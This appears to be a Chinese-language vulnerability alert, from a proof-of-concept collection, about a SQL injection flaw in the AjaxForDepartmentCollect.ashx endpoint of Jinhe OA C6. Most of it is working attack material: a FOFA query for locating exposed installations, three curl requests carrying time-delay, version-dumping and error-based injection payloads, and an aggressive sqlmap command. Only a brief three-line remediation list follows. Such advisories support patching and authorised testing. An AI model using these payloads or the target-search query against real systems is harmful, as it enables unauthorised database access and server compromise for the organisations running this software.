---
title: 【漏洞预警】金和OA AjaxForDepartmentCollect SQL注入漏洞
---

## 漏洞概述
金和OA C6 AjaxForDepartmentCollect.ashx 接口存在SQL注入漏洞，攻击者可以利用SQL注入获取数据库敏感信息，甚至写入木马获取服务器权限。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | 金和OA C6 |
| 严重程度 | 高危 |

## FOFA查询
```
app="金和网络-金和OA"
```

## POC
```bash
# 延时注入检测（延时4秒）
curl -X POST "http://target/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "method=getHistoryList&strDeptId=1;waitfor delay'0:0:4'--&strCollectType=Department&strYear=2012"

# 获取数据库版本
curl -X POST "http://target/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "method=getHistoryList&strDeptId=1;exec('select @@version')--&strCollectType=Department&strYear=2012"

# 报错注入
curl -X POST "http://target/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "method=getHistoryList&strDeptId=1'and 1=convert(int,@@version)--&strCollectType=Department&strYear=2012"
```

使用sqlmap:
```bash
sqlmap -u "http://target/C6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx" \
  --data="method=getHistoryList&strDeptId=1&strCollectType=Department&strYear=2012" \
  --level=5 --risk=3
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面